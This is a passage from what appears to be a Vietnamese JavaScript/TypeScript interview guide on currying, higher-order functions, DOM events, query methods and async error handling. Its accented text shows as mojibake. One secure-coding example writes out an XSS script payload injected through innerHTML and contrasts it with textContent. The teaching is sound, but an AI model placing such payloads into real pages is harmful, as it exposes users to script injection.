const calculateTax = (rate: number) => (amount: number) => amount * rate;

const calculateVAT = calculateTax(0.1); // VAT 10%
const calculateLuxuryTax = calculateTax(0.2); // Luxury tax 20%

console.log(calculateVAT(1000)); // 100 - 10% cá»§a 1000
console.log(calculateLuxuryTax(1000)); // 200 - 20% cá»§a 1000

// 3ï¸âƒ£ Currying vá»›i nhiá»u tham sá»‘
const volume = (length: number) => (width: number) => (height: number) =>
  length * width * height;

const boxVolume = volume(10)(5); // length=10, width=5, height=?
console.log(boxVolume(2)); // 10 * 5 * 2 = 100
console.log(boxVolume(3)); // 10 * 5 * 3 = 150
```

---

**ğŸ”¥ 3. Higher-Order Functions (HOF - HÃ m Báº­c Cao)**

**ğŸ’¡ HOF LÃ  GÃ¬?**

HOF lÃ  function thá»a mÃ£n 1 trong 2 Ä‘iá»u kiá»‡n:

1. **Nháº­n function lÃ m argument** (tham sá»‘)
2. **Tráº£ vá» function** (return function)

```typescript
// 1ï¸âƒ£ HOF nháº­n function lÃ m argument
function withLogging<T extends (...args: any[]) => any>(
  fn: T // âš ï¸ Nháº­n function lÃ m tham sá»‘
): (...args: Parameters<T>) => ReturnType<T> {
  return (...args: Parameters<T>) => {
    console.log('ğŸ” Gá»i function vá»›i:', args);
    const result = fn(...args); // Gá»i function gá»‘c
    console.log('âœ… Káº¿t quáº£:', result);
    return result;
  };
}

const add = (a: number, b: number) => a + b;
const loggedAdd = withLogging(add); // Bá»c add vá»›i logging

loggedAdd(2, 3);
// Output:
// ğŸ” Gá»i function vá»›i: [2, 3]
// âœ… Káº¿t quáº£: 5

// 2ï¸âƒ£ HOF tráº£ vá» function
function createGreeter(greeting: string) {
  return (name: string) => `${greeting}, ${name}!`; // âš ï¸ Return function
}

const sayHello = createGreeter('Xin chÃ o'); // Táº¡o function chÃ o há»i
const sayHi = createGreeter('Hi'); // Táº¡o function chÃ o há»i khÃ¡c

console.log(sayHello('John')); // "Xin chÃ o, John!"
console.log(sayHi('Jane')); // "Hi, Jane!"

// 3ï¸âƒ£ Array methods Ä‘á»u lÃ  HOF
const numbers = [1, 2, 3, 4, 5];

const doubled = numbers.map((x) => x * 2); // [2, 4, 6, 8, 10]
//                          â†‘ nháº­n function lÃ m argument

const evens = numbers.filter((x) => x % 2 === 0); // [2, 4]
//                           â†‘ nháº­n function lÃ m argument

const sum = numbers.reduce((acc, x) => acc + x, 0); // 15
//                         â†‘ nháº­n function lÃ m argument
```

**ğŸ¯ Practical Example - Data Processing:**

```typescript
// Xá»­ lÃ½ danh sÃ¡ch users
const users = [
  { name: 'John', age: 25, active: true },
  { name: 'Jane', age: 30, active: false },
  { name: 'Bob', age: 35, active: true },
];

// âŒ CÃ¡ch cÅ© - Imperative (má»‡nh lá»‡nh)
const activeUserNames = [];
for (let i = 0; i < users.length; i++) {
  if (users[i].active) {
    activeUserNames.push(users[i].name.toUpperCase());
  }
}
activeUserNames.sort();

// âœ… CÃ¡ch má»›i - Functional Programming
const activeUserNames2 = users
  .filter((user) => user.active) // 1. Lá»c user active
  .map((user) => user.name.toUpperCase()) // 2. Chuyá»ƒn tÃªn thÃ nh UPPERCASE
  .sort(); // 3. Sáº¯p xáº¿p

console.log(activeUserNames2); // ['BOB', 'JOHN'] - Ngáº¯n gá»n, dá»… Ä‘á»c!
```

---

**âœ… Best Practices:**

- âœ… **Æ¯u tiÃªn Pure Functions**: Code predictable, dá»… test
- âœ… **DÃ¹ng Currying cho reusable functions**: Táº¡o specialized functions
- âœ… **DÃ¹ng HOF thay vÃ¬ loops**: `map`, `filter`, `reduce` ngáº¯n gá»n hÆ¡n
- âœ… **Function Composition**: Káº¿t há»£p functions nhá» thÃ nh function lá»›n
- âœ… **IIFE cho module pattern**: Táº¡o private scope khi cáº§n

**âŒ Common Mistakes:**

```typescript
// âŒ Sai: Impure function vá»›i side effects
let total = 0;
function addToTotal(value: number): void {
  total += value; // âŒ Side effect - thay Ä‘á»•i biáº¿n global
}

// âœ… ÄÃºng: Pure function
function add(total: number, value: number): number {
  return total + value; // âœ… Return giÃ¡ trá»‹ má»›i, khÃ´ng thay Ä‘á»•i state
}

// âŒ Sai: KhÃ´ng dÃ¹ng HOF khi cÃ³ thá»ƒ
const numbers = [1, 2, 3, 4, 5];
const doubled = [];
for (let i = 0; i < numbers.length; i++) {
  doubled.push(numbers[i] * 2); // âŒ DÃ i dÃ²ng, dá»… lá»—i
}

// âœ… ÄÃºng: DÃ¹ng HOF
const doubled2 = numbers.map((x) => x * 2); // âœ… Ngáº¯n gá»n, rÃµ rÃ ng

// âŒ Sai: KhÃ´ng dÃ¹ng currying khi cáº§n reuse
function calculateTax(rate: number, amount: number): number {
  return amount * rate;
}
const tax1 = calculateTax(0.1, 1000); // âŒ Láº·p láº¡i rate nhiá»u láº§n
const tax2 = calculateTax(0.1, 2000);

// âœ… ÄÃºng: DÃ¹ng currying
const calculateTax2 = (rate: number) => (amount: number) => amount * rate;
const calculateVAT = calculateTax2(0.1); // âœ… Táº¡o function vá»›i rate cá»‘ Ä‘á»‹nh
const tax3 = calculateVAT(1000); // Gá»n hÆ¡n, tÃ¡i sá»­ dá»¥ng Ä‘Æ°á»£c
const tax4 = calculateVAT(2000);
```

**ğŸ“ TÃ³m Táº¯t:**

| Concept        | MÃ´ Táº£                                          | Use Case                      |
| -------------- | ---------------------------------------------- | ----------------------------- |
| **IIFE**       | Function tá»± gá»i, táº¡o scope riÃªng               | Module pattern, private state |
| **Pure**       | HÃ m khÃ´ng side effects, predictable            | Business logic, calculations  |
| **Currying**   | Function nhiá»u tham sá»‘ â†’ chuá»—i functions       | Reusable functions, config    |
| **HOF**        | Function nháº­n/tráº£ vá» function                  | map, filter, reduce, compose  |
| **Functional** | Paradigm táº­p trung vÃ o pure functions, compose | Clean code, maintainable      |

---

## **Pháº§n 5: DOM & Events**

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸª Q17: DOM Events - Event Flow, Delegation & Event Properties (Bubbling, Capturing, target vs currentTarget)</span></summary>


**âš¡ Quick Summary:**
> Event Bubbling = child â†’ parent. Capturing = parent â†’ child. Delegation = listen á»Ÿ parent

**ğŸ’¡ Ghi Nhá»›:**
- ğŸ¯ **Bubbling**: Event tá»« child lÃªn parent (default)
- â¬‡ï¸ **Capturing**: Event tá»« parent xuá»‘ng child (useCapture: true)
- ğŸ­ **target vs currentTarget**: target = pháº§n tá»­ gá»‘c, currentTarget = pháº§n tá»­ cÃ³ listener

**â“ CÃ¢u Há»i:**

Giáº£i thÃ­ch chi tiáº¿t cÆ¡ cháº¿ hoáº¡t Ä‘á»™ng cá»§a DOM Events trong JavaScript, bao gá»“m:

1. Event Flow (Event Bubbling vs Event Capturing)
2. Event Delegation Pattern
3. Sá»± khÃ¡c biá»‡t giá»¯a `target` vÃ  `currentTarget`
4. CÃ¡c best practices vÃ  common mistakes

</details>

**ğŸ“š Pháº§n 1: Event Flow - 3 Phases cá»§a DOM Events**

**ğŸ”¥ CÆ¡ Cháº¿ Hoáº¡t Äá»™ng:**

Khi má»™t event xáº£y ra trÃªn DOM element, nÃ³ Ä‘i qua 3 phases (giai Ä‘oáº¡n):

```
Phase 1: CAPTURING PHASE (Giai Ä‘oáº¡n báº¯t - tá»« trÃªn xuá»‘ng)
   â†“
   document
   â†“
   html
   â†“
   body
   â†“
   parent div
   â†“
Phase 2: TARGET PHASE (Giai Ä‘oáº¡n má»¥c tiÃªu)
   â†“
   target element (element Ä‘Æ°á»£c click)
   â†“
Phase 3: BUBBLING PHASE (Giai Ä‘oáº¡n ná»•i - tá»« dÆ°á»›i lÃªn)
   â†‘
   parent div
   â†‘
   body
   â†‘
   html
   â†‘
   document
```

**ğŸ’¡ Giáº£i ThÃ­ch Tiáº¿ng Viá»‡t:**

- **Capturing Phase (Báº¯t sá»± kiá»‡n)**: Event "rÆ¡i xuá»‘ng" tá»« window â†’ document â†’ html â†’ body â†’ ... â†’ target element
- **Target Phase (Má»¥c tiÃªu)**: Event cháº¡m Ä‘áº¿n element Ä‘Æ°á»£c click (target)
- **Bubbling Phase (Ná»•i lÃªn)**: Event "ná»•i lÃªn" tá»« target element â†’ ... â†’ body â†’ html â†’ document â†’ window

**ğŸ¯ Code Example vá»›i ChÃº ThÃ­ch Tiáº¿ng Viá»‡t:**

```typescript
// ğŸ“Œ HTML Structure (Cáº¥u trÃºc HTML)
// <div id="grandparent" style="padding: 50px; background: red;">
//   Grandparent (Ã”ng)
//   <div id="parent" style="padding: 30px; background: blue;">
//     Parent (Cha)
//     <div id="child" style="padding: 20px; background: green;">
//       <button id="button">Click Me!</button>
//     </div>
//   </div>
// </div>

// ============================================
// ğŸ”µ EXAMPLE 1: EVENT BUBBLING (Máº·c Ä‘á»‹nh)
// Event ná»•i lÃªn tá»« dÆ°á»›i lÃªn: Button â†’ Child â†’ Parent â†’ Grandparent
// ============================================

// ChÃº thÃ­ch: addEventListener() máº·c Ä‘á»‹nh láº¯ng nghe á»Ÿ BUBBLING phase
// Tham sá»‘ thá»© 3 = false (hoáº·c khÃ´ng truyá»n) nghÄ©a lÃ  bubbling  
document.getElementById('button')?.addEventListener('click', (e: Event) => {
  console.log('1ï¸âƒ£ Button clicked (bubbling)');
  // Cháº¡y Ä‘áº§u tiÃªn vÃ¬ button lÃ  target element (pháº§n tá»­ Ä‘Æ°á»£c click)
});

document.getElementById('child')?.addEventListener('click', (e: Event) => {
  console.log('2ï¸âƒ£ Child div clicked (bubbling)');
  // Cháº¡y thá»© 2 - event ná»•i lÃªn tá»« button
});

document.getElementById('parent')?.addEventListener('click', (e: Event) => {
  console.log('3ï¸âƒ£ Parent div clicked (bubbling)');
  // Cháº¡y thá»© 3 - event tiáº¿p tá»¥c ná»•i lÃªn
});

document.getElementById('grandparent')?.addEventListener('click', (e: Event) => {
  console.log('4ï¸âƒ£ Grandparent div clicked (bubbling)');
  // Cháº¡y cuá»‘i cÃ¹ng - event ná»•i Ä‘áº¿n táº­n Ã´ng ná»™i
});

// ğŸ“ Káº¾T QUáº¢ khi click button:
// 1ï¸âƒ£ Button clicked (bubbling)
// 2ï¸âƒ£ Child div clicked (bubbling)
// 3ï¸âƒ£ Parent div clicked (bubbling)
// 4ï¸âƒ£ Grandparent div clicked (bubbling)

// ============================================
// ğŸŸ¢ EXAMPLE 2: EVENT CAPTURING (Báº¯t sá»± kiá»‡n)
// Event rÆ¡i xuá»‘ng tá»« trÃªn xuá»‘ng: Grandparent â†’ Parent â†’ Child â†’ Button
// ============================================

// ChÃº thÃ­ch: Tham sá»‘ thá»© 3 = true nghÄ©a lÃ  CAPTURING phase
document.getElementById('grandparent')?.addEventListener(
  'click',
  (e: Event) => {
    console.log('1ï¸âƒ£ Grandparent clicked (capturing)');
    // Cháº¡y Ä‘áº§u tiÃªn - Ã´ng ná»™i báº¯t event trÆ°á»›c
  },
  true // âš ï¸ true = capturing phase (báº¯t tá»« trÃªn xuá»‘ng)
);

document.getElementById('parent')?.addEventListener(
  'click',
  (e: Event) => {
    console.log('2ï¸âƒ£ Parent clicked (capturing)');
    // Cháº¡y thá»© 2 - cha báº¯t event
  },
  true
);

document.getElementById('child')?.addEventListener(
  'click',
  (e: Event) => {
    console.log('3ï¸âƒ£ Child clicked (capturing)');
    // Cháº¡y thá»© 3 - con báº¯t event
  },
  true
);

document.getElementById('button')?.addEventListener(
  'click',
  (e: Event) => {
    console.log('4ï¸âƒ£ Button clicked (capturing)');
    // Cháº¡y cuá»‘i cÃ¹ng - Ä‘áº¿n target element
  },
  true
);

// ğŸ“ Káº¾T QUáº¢ khi click button:
// 1ï¸âƒ£ Grandparent clicked (capturing)
// 2ï¸âƒ£ Parent clicked (capturing)
// 3ï¸âƒ£ Child clicked (capturing)
// 4ï¸âƒ£ Button clicked (capturing)

// ============================================
// ğŸ›‘ EXAMPLE 3: STOP PROPAGATION
// Dá»«ng event lan truyá»n (khÃ´ng ná»•i lÃªn hoáº·c rÆ¡i xuá»‘ng ná»¯a)
// ============================================

document.getElementById('child')?.addEventListener('click', (e: Event) => {
  console.log('Child clicked');
  e.stopPropagation(); // â›” Dá»«ng event táº¡i Ä‘Ã¢y - khÃ´ng lan truyá»n ná»¯a
  // Event KHÃ”NG ná»•i lÃªn parent vÃ  grandparent
});

document.getElementById('parent')?.addEventListener('click', () => {
  console.log('Parent clicked'); // âŒ KHÃ”NG cháº¡y vÃ¬ bá»‹ stopPropagation()
});

// ============================================
// ğŸš« EXAMPLE 4: PREVENT DEFAULT
// NgÄƒn hÃ nh vi máº·c Ä‘á»‹nh cá»§a trÃ¬nh duyá»‡t
// ============================================

// VÃ­ dá»¥ 1: NgÄƒn link navigate
document.getElementById('myLink')?.addEventListener('click', (e: Event) => {
  e.preventDefault(); // â›” NgÄƒn trÃ¬nh duyá»‡t chuyá»ƒn trang
  console.log('Link clicked but navigation prevented');
  // ChÃº thÃ­ch: Thay vÃ¬ chuyá»ƒn trang, ta cÃ³ thá»ƒ xá»­ lÃ½ logic khÃ¡c
});

// VÃ­ dá»¥ 2: NgÄƒn form submit
document.getElementById('myForm')?.addEventListener('submit', (e: Event) => {
  e.preventDefault(); // â›” NgÄƒn form gá»­i Ä‘i (reload trang)
  console.log('Form submit prevented - validating data...');
  // ChÃº thÃ­ch: Validate dá»¯ liá»‡u trÆ°á»›c khi submit báº±ng AJAX
});
```

---

**ğŸ“š Pháº§n 2: Event Delegation (Ká»¹ Thuáº­t á»¦y Quyá»n Event)**

**ğŸ”¥ KhÃ¡i Niá»‡m:**

Event Delegation lÃ  ká»¹ thuáº­t thay vÃ¬ gáº¯n event listener cho tá»«ng element con, ta chá»‰ gáº¯n 1 listener duy nháº¥t cho element cha, sau Ä‘Ã³ kiá»ƒm tra xem element nÃ o Ä‘Æ°á»£c click thÃ´ng qua `event.target`.

**ğŸ’¡ Lá»£i Ãch:**

1. **Performance tá»‘t hÆ¡n**: Chá»‰ cÃ³ 1 event listener thay vÃ¬ hÃ ng trÄƒm/ngÃ n listeners
2. **Memory hiá»‡u quáº£**: Ãt listeners = Ã­t bá»™ nhá»›  
3. **Dynamic content**: Tá»± Ä‘á»™ng handle cÃ¡c elements Ä‘Æ°á»£c thÃªm sau
4. **Maintainability**: Code dá»… báº£o trÃ¬ hÆ¡n

**ğŸ¯ Code Example vá»›i ChÃº ThÃ­ch Chi Tiáº¿t:**

```typescript
// ============================================
// âŒ CÃCH KHÃ”NG HIá»†U QUáº¢: Attach event cho tá»«ng item
// ============================================

// HTML: <ul id="todoList">
//         <li class="todo-item" data-id="1">Task 1 <button class="delete">X</button></li>
//         <li class="todo-item" data-id="2">Task 2 <button class="delete">X</button></li>
//         <li class="todo-item" data-id="3">Task 3 <button class="delete">X</button></li>
//       </ul>

// âŒ Váº¤N Äá»€: Náº¿u cÃ³ 1000 items thÃ¬ táº¡o 1000 event listeners!
const todoItems = document.querySelectorAll('.todo-item');
todoItems.forEach((item) => {
  item.addEventListener('click', (e: Event) => {
    console.log('Todo clicked:', item.dataset.id);
    // ChÃº thÃ­ch: Má»—i item cÃ³ 1 listener riÃªng â†’ tá»‘n memory
  });
});

// ============================================
// âœ… CÃCH HIá»†U QUáº¢: EVENT DELEGATION
// ============================================

// âœ… Chá»‰ cáº§n 1 listener trÃªn parent (ul)
document.getElementById('todoList')?.addEventListener('click', (e: Event) => {
  const target = e.target as HTMLElement;

  // ChÃº thÃ­ch: Kiá»ƒm tra xem element Ä‘Æ°á»£c click cÃ³ pháº£i lÃ  todo-item khÃ´ng
  if (target.classList.contains('todo-item')) {
    console.log('âœ… Todo clicked:', target.dataset.id);
    // ChÃº thÃ­ch: Xá»­ lÃ½ click vÃ o todo item
  }

  // ChÃº thÃ­ch: Kiá»ƒm tra xem cÃ³ pháº£i click vÃ o nÃºt delete khÃ´ng
  if (target.classList.contains('delete')) {
    // closest() tÃ¬m parent element gáº§n nháº¥t cÃ³ class 'todo-item'
    const todoItem = target.closest('.todo-item') as HTMLElement;
    console.log('ğŸ—‘ï¸ Delete clicked for todo:', todoItem?.dataset.id);
    todoItem?.remove(); // XÃ³a todo item
  }
});

// âœ… ThÃªm item má»›i - KHÃ”NG Cáº¦N attach listener
function addTodoItem(text: string, id: string): void {
  const todoList = document.getElementById('todoList');
  const newItem = document.createElement('li');
  newItem.className = 'todo-item';
  newItem.dataset.id = id;
  newItem.innerHTML = `${text} <button class="delete">X</button>`;
  todoList?.appendChild(newItem);
  
  // ğŸ‰ Event delegation tá»± Ä‘á»™ng handle item má»›i!
  // KhÃ´ng cáº§n addEventListener() á»Ÿ Ä‘Ã¢y
}
```

---

**ğŸ“š Pháº§n 3: target vs currentTarget - Hiá»ƒu RÃµ Sá»± KhÃ¡c Biá»‡t**

**ğŸ”¥ Äá»‹nh NghÄ©a:**

- **`event.target`**: Element THá»°C Sá»° Ä‘Æ°á»£c click (cÃ³ thá»ƒ lÃ  element con sÃ¢u bÃªn trong)
- **`event.currentTarget`**: Element cÃ³ EVENT LISTENER Ä‘Æ°á»£c attach (luÃ´n lÃ  element ta gá»i addEventListener)

**ğŸ¯ Code Example:**

```typescript
// HTML: <div id="parent">
//         <button id="child">Click Me!</button>
//       </div>

document.getElementById('parent')?.addEventListener('click', (e: Event) => {
  console.log('target:', e.target); // <button id="child">
  console.log('currentTarget:', e.currentTarget); // <div id="parent">
  
  // ChÃº thÃ­ch:
  // - target = button (thá»© Ä‘Æ°á»£c click thá»±c sá»±)
  // - currentTarget = div parent (nÆ¡i cÃ³ addEventListener)
});
```

**ğŸ“Œ So SÃ¡nh:**

| Property | target | currentTarget |
|----------|--------|---------------|
| **Äá»‹nh nghÄ©a** | Element THá»°C Sá»° Ä‘Æ°á»£c click | Element CÃ“ addEventListener() |
| **Trong event delegation** | Con hoáº·c chÃ¡u cá»§a currentTarget | LuÃ´n lÃ  parent element |
| **Sá»­ dá»¥ng** | XÃ¡c Ä‘á»‹nh element cá»¥ thá»ƒ Ä‘Æ°á»£c tÆ°Æ¡ng tÃ¡c | Truy cáº­p data/properties cá»§a parent |

---

**âœ… Best Practices:**

1. Sá»­ dá»¥ng Event Delegation cho dynamic content
2. Sá»­ dá»¥ng `closest()` Ä‘á»ƒ tÃ¬m parent element
3. Check target type trÆ°á»›c khi xá»­ lÃ½
4. Sá»­ dá»¥ng `stopPropagation()` khi cáº§n thiáº¿t
5. Sá»­ dá»¥ng `preventDefault()` cho forms vÃ  links

**âŒ Common Mistakes:**

1. Nháº§m láº«n target vs currentTarget
2. KhÃ´ng check element type
3. QuÃªn stopPropagation() khi cÃ³ nested events
4. Event delegation nhÆ°ng khÃ´ng check target
5. Mix capturing vÃ  bubbling khÃ´ng rÃµ rÃ ng
</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸŒ Q18: DOM API & Query Methods</span></summary>


**âš¡ Quick Summary:**
> querySelector = CSS selector. getElementById = nhanh nháº¥t. querySelectorAll = NodeList

**ğŸ’¡ Ghi Nhá»›:**
- âš¡ **getElementById**: Nhanh nháº¥t, live
- ğŸ¯ **querySelector**: CSS selector, static
- ğŸ“‹ **querySelectorAll**: Return NodeList (not array)

**Tráº£ lá»i:**

- **DOM API**: CÃ¡c methods Ä‘á»ƒ manipulate DOM elements
- **Query Methods**: CÃ¡c methods Ä‘á»ƒ select elements tá»« DOM
- **Hoáº¡t Ä‘á»™ng**: getElementById, querySelector, getElementsByClassName, etc.
- **Æ¯u Ä‘iá»ƒm**: Flexible element selection, powerful manipulation
- **NhÆ°á»£c Ä‘iá»ƒm**: CÃ³ thá»ƒ cháº­m vá»›i large DOM, cáº§n hiá»ƒu rÃµ performance

**Code Example:**

```typescript
// Query Methods
// getElementById - tráº£ vá» single element
const element = document.getElementById('myId');
if (element) {
  element.textContent = 'Hello World';
}

// querySelector - tráº£ vá» first matching element
const firstDiv = document.querySelector('div');
const firstClass = document.querySelector('.my-class');
const firstId = document.querySelector('#my-id');

// querySelectorAll - tráº£ vá» NodeList
const allDivs = document.querySelectorAll('div');
const allClasses = document.querySelectorAll('.my-class');

// getElementsByClassName - tráº£ vá» HTMLCollection
const elementsByClass = document.getElementsByClassName('my-class');

// getElementsByTagName - tráº£ vá» HTMLCollection
const elementsByTag = document.getElementsByTagName('div');

// DOM Manipulation
const div = document.createElement('div');
div.textContent = 'New element';
div.className = 'my-class';
div.id = 'new-id';

// Append to DOM
document.body.appendChild(div);

// Insert before
const existingElement = document.getElementById('existing');
existingElement?.parentNode?.insertBefore(div, existingElement);

// Remove element
div.remove();

// Update attributes
div.setAttribute('data-id', '123');
div.getAttribute('data-id'); // '123'
div.removeAttribute('data-id');

// Update classes
div.classList.add('new-class');
div.classList.remove('old-class');
div.classList.toggle('active');
div.classList.contains('active'); // true/false

// Update styles
div.style.color = 'red';
div.style.backgroundColor = 'blue';
div.style.display = 'none';

// Update content
div.textContent = 'Text content';
div.innerHTML = '<span>HTML content</span>';
div.innerText = 'Text only (no HTML)';

// Event handling
div.addEventListener('click', (e: Event) => {
  console.log('Div clicked');
});

// Remove event listener
const clickHandler = (e: Event) => console.log('Clicked');
div.addEventListener('click', clickHandler);
div.removeEventListener('click', clickHandler);
```

**Best Practices:**

- Sá»­ dá»¥ng querySelector cho modern development
- Sá»­ dá»¥ng getElementById cho single elements
- Sá»­ dá»¥ng addEventListener thay vÃ¬ onclick
- Sá»­ dá»¥ng proper error handling

**Mistakes:**

```typescript
// âŒ Sai: KhÃ´ng check null
const element = document.getElementById('myId');
element.textContent = 'Hello'; // Error náº¿u element null

// âœ… ÄÃºng: Check null
const element = document.getElementById('myId');
if (element) {
  element.textContent = 'Hello';
}

// âŒ Sai: Sá»­ dá»¥ng innerHTML vá»›i user input
const userInput = '<script>alert("XSS")</script>';
div.innerHTML = userInput; // XSS vulnerability

// âœ… ÄÃºng: Sá»­ dá»¥ng textContent
div.textContent = userInput; // Safe
```

</details>

## **Pháº§n 6: Type Checking & Operators**

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">âš™ï¸ Q19: Async/Await vs Promises vs Callbacks & Promise.all/any/race</span></summary>


**âš¡ Quick Summary:**
> Callbacks = nested hell. Promises = chaining. Async/await = sync-like code. Promise.all/any/race/allSettled = combine nhiá»u promises

**ğŸ’¡ Ghi Nhá»›:**
- ğŸ¯ **Callbacks**: Nested = hell, error handling khÃ³
- ğŸ“Œ **Promises**: Chaining vá»›i .then(), error vá»›i .catch()
- âš¡ **Async/Await**: Sync-like code, try/catch cho errors
- ğŸ”¥ **Combinators**: all (all success), any (first success), race (first done), allSettled (all done)

**Tráº£ lá»i:**

**Pháº§n 1: Async Patterns**

- **Callbacks**: Functions Ä‘Æ°á»£c pass vÃ o other functions Ä‘á»ƒ execute sau
- **Promises**: Objects Ä‘áº¡i diá»‡n cho eventual completion/failure cá»§a async operation
- **Async/Await**: Syntactic sugar cho Promises, lÃ m code dá»… Ä‘á»c hÆ¡n

**Pháº§n 2: Promise Combinators**

- **Promise.all**: Äá»£i táº¥t cáº£ promises resolve, reject náº¿u cÃ³ 1 promise reject
- **Promise.any**: Resolve khi cÃ³ 1 promise resolve, reject náº¿u táº¥t cáº£ reject
- **Promise.race**: Resolve/reject vá»›i promise Ä‘áº§u tiÃªn hoÃ n thÃ nh
- **Promise.allSettled**: Äá»£i táº¥t cáº£ promises complete (resolve hoáº·c reject)

**Code Example:**

```typescript
// Callbacks
function fetchData(callback: (error: Error | null, data?: any) => void): void {
  setTimeout(() => {
    const data = { message: 'Hello World' };
    callback(null, data);
  }, 1000);
}

fetchData((error, data) => {
  if (error) {
    console.error('Error:', error);
  } else {
    console.log('Data:', data);
  }
});

// Promises
function fetchDataPromise(): Promise<any> {
  return new Promise((resolve, reject) => {
    setTimeout(() => {
      const data = { message: 'Hello World' };
      resolve(data);
    }, 1000);
  });
}

fetchDataPromise()
  .then((data) => console.log('Data:', data))
  .catch((error) => console.error('Error:', error));

// Async/Await
async function fetchDataAsync(): Promise<any> {
  try {
    const data = await fetchDataPromise();
    console.log('Data:', data);
    return data;
  } catch (error) {
    console.error('Error:', error);
    throw error;
  }
}
```

**Best Practices:**

- Sá»­ dá»¥ng async/await cho modern code
- Sá»­ dá»¥ng proper error handling
- TrÃ¡nh callback hell
- Sá»­ dá»¥ng TypeScript cho type safety

#### **ğŸ”¥ Advanced Async Patterns - CÃ¡c Váº¥n Äá» Báº¥t Äá»“ng Bá»™ Phá»©c Táº¡p**

**ğŸ’¡ Sau khi hiá»ƒu cÆ¡ báº£n vá» Callbacks, Promises, Async/Await, hÃ£y giáº£i quyáº¿t cÃ¡c váº¥n Ä‘á» thá»±c táº¿ phá»©c táº¡p hÆ¡n!**

---

#### **1ï¸âƒ£ Error Handling - Xá»­ LÃ½ Lá»—i NÃ¢ng Cao**

**ğŸ”¹ Problem: Async errors khÃ´ng bá»‹ catch**

```typescript
// âŒ Váº¤N Äá»€: Unhandled Promise Rejection
async function fetchUser(id: string) {
  const response = await fetch(`/api/users/${id}`);
  return response.json(); // Náº¿u response.json() throw error?
}

// Calling without try-catch â†’ Unhandled rejection!
fetchUser('123'); // âŒ Náº¿u API fail â†’ unhandled rejection

// âœ… GIáº¢I PHÃP 1: Try-catch trong function
async function fetchUserSafe(id: string) {
  try {
    const response = await fetch(`/api/users/${id}`);
    
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    }
    
    return await response.json();
  } catch (error) {
    console.error('Failed to fetch user:', error);
    throw error; // Re-throw Ä‘á»ƒ caller handle
  }
}

// âœ… GIáº¢I PHÃP 2: Global error handler
window.addEventListener('unhandledrejection', (event) => {
  console.error('Unhandled promise rejection:', event.reason);
  
  // Send to error tracking service (Sentry, Datadog)
  sendToErrorTracking({
    type: 'UNHANDLED_PROMISE_REJECTION',
    error: event.reason,
    timestamp: Date.now(),
  });
  
  // Prevent default browser behavior
  event.preventDefault();
});

// âœ… GIáº¢I PHÃP 3: Wrapper function vá»›i automatic error handling
async function safeAsync<T>(
  fn: () => Promise<T>,
  fallback?: T
): Promise<T | undefined> {
  try {
    return await fn();
  } catch (error) {
    console.error('Async error:', error);
    return fallback;
  }
}

// Usage
const user = await safeAsync(() => fetchUser('123'), { id: '123', name: 'Default' });
```

**ğŸ”¹ Problem: Mixed sync/async errors**

```typescript
// âŒ Váº¤N Äá»€: Sync errors khÃ´ng Ä‘Æ°á»£c catch bá»Ÿi try-catch async
async function processData(data: any[]) {
  try {
    const validated = validateData(data); // Sync function cÃ³ thá»ƒ throw
    const results = await Promise.all(
      validated.map(item => processItem(item)) // Async function
    );
    return results;
  } catch (error) {
    // âš ï¸ Catch Ä‘Æ°á»£c cáº£ sync VÃ€ async errors
    console.error('Process failed:', error);
    throw error;
  }
}

// âœ… BEST PRACTICE: Wrap sync code trong Promise náº¿u cáº§n
async function processDataSafe(data: any[]) {
  try {
    // Wrap sync validation trong Promise
    const validated = await Promise.resolve(validateData(data));
    const results = await Promise.all(
      validated.map(item => processItem(item))
    );
    return results;
  } catch (error) {
    console.error('Process failed:', error);
    throw error;
  }
}
```

---

#### **2ï¸âƒ£ Race Conditions - Xá»­ LÃ½ TÃ¬nh Huá»‘ng Cháº¡y Äua**

**ğŸ”¹ Problem: Multiple concurrent requests**

```typescript
// âŒ Váº¤N Äá»€: User search - requests out of order
let searchTerm = '';

async function handleSearch(term: string) {
  searchTerm = term;
  
  // Slow request (200ms)
  const results = await fetch(`/api/search?q=${term}`).then(r => r.json());
  
  // âš ï¸ Váº¤N Äá»€: Náº¿u user type "abc" rá»“i xÃ³a vá» "ab":
  // Request "ab" gá»­i trÆ°á»›c, nhÆ°ng "abc" vá» sau
  // â†’ Hiá»ƒn thá»‹ sai káº¿t quáº£!
  displayResults(results);
}

// âœ… GIáº¢I PHÃP 1: Track latest request vá»›i counter
let requestId = 0;

async function handleSearchSafe(term: string) {
  const currentRequestId = ++requestId;
  
  const results = await fetch(`/api/search?q=${term}`).then(r => r.json());
  
  // Chá»‰ hiá»ƒn thá»‹ náº¿u lÃ  request má»›i nháº¥t
  if (currentRequestId === requestId) {
    displayResults(results);
  } else {
    console.log('Discarding stale result');
  }
}

// âœ… GIáº¢I PHÃP 2: AbortController Ä‘á»ƒ cancel previous requests
let abortController: AbortController | null = null;

async function handleSearchWithAbort(term: string) {
  // Cancel previous request
  if (abortController) {
    abortController.abort();
  }
  
  // Create new controller
  abortController = new AbortController();
  
  try {
    const results = await fetch(`/api/search?q=${term}`, {
      signal: abortController.signal,
    }).then(r => r.json());
    
    displayResults(results);
  } catch (error: any) {
    if (error.name === 'AbortError') {
      console.log('Request cancelled');
    } else {
      throw error;
    }
  }
}

// âœ… GIáº¢I PHÃP 3: Debounce + Abort (Best for search)
import { debounce } from 'lodash';

let searchAbortController: AbortController | null = null;

const debouncedSearch = debounce(async (term: string) => {
  if (searchAbortController) {
    searchAbortController.abort();
  }
  
  searchAbortController = new AbortController();
  
  try {
    const results = await fetch(`/api/search?q=${term}`, {
      signal: searchAbortController.signal,
    }).then(r => r.json());
    
    displayResults(results);
  } catch (error: any) {
    if (error.name !== 'AbortError') {
      console.error('Search failed:', error);
    }
  }
}, 300); // Wait 300ms sau khi user ngá»«ng typing

// Usage: Gá»i má»—i khi user type
inputElement.addEventListener('input', (e) => {
  debouncedSearch(e.target.value);
});
```

**ğŸ”¹ Problem: Concurrent updates to shared state**

```typescript
// âŒ Váº¤N Äá»€: Multiple async operations update same state
let balance = 1000;

async function withdraw(amount: number) {
  // Simulate API call
  await delay(100);
  
  if (balance >= amount) {
    balance -= amount; // âš ï¸ Race condition!
    console.log(`Withdrew ${amount}, balance: ${balance}`);
  }
}

// Gá»i Ä‘á»“ng thá»i
withdraw(600); // T0: Check balance = 1000 âœ…
withdraw(600); // T1: Check balance = 1000 âœ…
